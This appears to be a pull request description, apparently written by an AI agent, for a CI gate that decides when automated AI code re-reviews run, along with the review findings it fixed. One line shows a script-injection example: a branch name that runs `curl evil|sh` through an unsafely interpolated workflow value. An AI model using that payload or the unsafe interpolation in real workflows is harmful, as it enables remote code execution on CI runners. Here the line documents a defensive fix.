## Context

Two of Chris's calls, one change.

**Opus back.** Sonnet ran one review at $0.88 against an Opus average of $1.14 — 23%, not the 80%
the estimate claimed, because it used *more* turns to get there. At that margin the quality question
decides it, and Opus is what found the subtle guard bugs during MO-051's rollout. The gate, not the
model, is what moves the bill.

**Re-reviews should not fire on a push that changed nothing worth re-reading**, with one signal being
whether the push addressed anything the last review raised.

## The gap in the gate that shipped yesterday

MO-26-08-02-03.25.14 asks *does this change contain code?* — right for a first review, wrong for a
second, in both directions:

- It compares against the **merge base**, so a re-review re-reads the whole pull request rather than
  what arrived since anyone looked.
- It skips records-only pushes — including **the push that fixes what the review just asked for**.
  Not hypothetical: the most valuable re-review this rung has done confirmed a fix to a roadmap
  item's prose that it had itself demanded one pass earlier. Under yesterday's gate that confirmation
  would never have run.

## Approach

**Diff against the last reviewed commit, not the merge base.** The previous SHA comes from this
workflow's own run history — the runs already record what was reviewed and when, so nothing new is
stored and there is no cursor that can disagree with reality. A first review finds none and falls
back to the base branch.

**Add the second signal Chris asked for.** The workflow fetches the last review's body and hands it
to the gate. If the incremental change touches a file that review *named*, it is worth re-reviewing —
even when the file is a roadmap item that the code test would skip.

`pathsMentioned` is deliberately a shallow heuristic and errs toward matching. A reviewer writes
paths in prose and any parser for that is guessing; the failure to avoid is guessing *narrowly* and
silently skipping the confirmation pass, so every rule widens rather than narrows. URLs are excluded,
because a review linking to GitHub's docs is not naming a file here and would otherwise make almost
any push look like it addressed something.

**What it does not claim.** It cannot tell whether a finding was actually *fixed* — only that the
push touched the same file. Nothing short of another review can judge the fix, which is the entire
point: this decides whether spending that review is worth it.

## Test plan

- `pathsMentioned`: backticked, bare, parenthesised, with a line number; deduplicated; URLs excluded;
  empty for a review naming no file.
- The gate in both directions — a records-only push that touches a named file is reviewed, one that
  does not is skipped, a code push is reviewed regardless, and an empty prior review does not read as
  naming everything.
- Workflow guards: it diffs against `steps.since.outputs.base`, passes `--prior-review`, and falls
  back to the base branch on a first review.

## Open questions

None. Whether the heuristic is too loose or too tight is answerable only by watching it, and the
reason is printed on every run so the decision is legible in the log.

## What the rung found on this pull request

**Three findings and four minors across two passes, not two.** The first version of this section said
"two findings" because I read the review to line 45 and stopped — the second time in one session I
have acted on a partial read, which `learned.md` already warns about. Corrected here rather than
quietly, because this repo's argument for re-reviews rests on the item file being true.

**The caller workflow was hardcoded as `ci.yml`.** `agent-review.yml` is reusable and a reusable
workflow has no runs of its own, so the caller must be named — but naming Morpheus's own would have
made this a **permanent, silent no-op in every consumer** whose caller is called anything else: the
404 swallowed, the fallback firing on every push, and the only trace a log line that reads exactly
like a normal first review. Now derived from `GITHUB_WORKFLOW_REF`, with a test asserting `ci.yml`
is *not* hardcoded rather than that it is.

It also pointed out the cursor tracks the run's conclusion, which is CI health rather than review
activity — a green run may be one this gate skipped, a red one may be a failing test on a commit the
reviewer did read. Both directions err toward reviewing again, which is the safe way round, so the
comment now says that plainly instead of claiming more than it does.

**`pathsMentioned` narrowed in the one place its docstring promised to widen.** The leading boundary
class excluded `*`, so `**src/cli/review.ts**` did not match — bold being the most common way a
reviewer cites a file, including in the review that reported this.

And the reason that was not obvious from the tests: **the URL guards were unreachable.** The capture
group is `[\w.-]` and `/`, so it can never contain a colon and `/^https?:/` never fired. The URL test
passed because the boundary class refused to start a match there — one mechanism doing two jobs, and
a test proving neither. URLs are now removed before matching, which is what let the boundary go away
entirely.

Verified both by probe before fixing, rather than on the reviewer's say-so.

### The second pass, and what was fixed from it

**Script injection.** `${{ github.head_ref }}` was interpolated into a `run:` block. `${{ }}`
substitutes *before* bash parses, and a branch name is attacker-controlled on a fork pull request —
so a branch called `x";curl evil|sh;"` executes. This repo is public and takes external
contributions, so it is live rather than theoretical. Every such value now reaches bash through
`env:` as data. The reviewer filed it under "Minor"; it was the most serious thing in the review.

**Passing mentions trigger re-reviews.** The gate was handed the *whole* tracking comment — including
its todo checklist (`- [x] Read src/x.ts`) and closing remarks. A live instance existed already: the
previous review's last line mentions `.agent/decisions.md`, so the next records-only push would have
been re-reviewed at ~$1.14 on the strength of a sentence that raised nothing. Checklist lines are now
stripped. **Prose passing mentions remain a known looseness** — the input is the wrong shape for a
regex to separate, and tuning the matcher will not fix it. Written down so the matcher is not blamed
when it is observed to be too loose.

**A crashing gate skipped rather than reviewed.** `review=$(node …)` swallows a non-zero exit into an
empty string, which reads as false — discarding the fail-open `needed()` goes out of its way to
provide. It now reviews and warns.

### Filed rather than fixed here

- **URL stripping removes the two most explicit citations** — a GitHub blob permalink and the
  `[Fix this →]` links, both of which spell out paths. Same asymmetry the docstring disowns.
- **The "safe way round" claim rests on an unpinned invariant**: it holds only because the reviewer
  reads the whole PR rather than the incremental base. Worth an assertion so a later token
  optimisation cannot silently falsify it.
- **The empty-diff branch now means the opposite of what its comment says** — under the new base an
  empty diff means "nothing since anyone looked", the strongest reason to skip, and it is still read
  as a git failure.

Its own honesty is worth noting: it flagged that it could not run `node` this pass, and told me to
treat the regex claims as arguments rather than measurements. I probed them before acting.
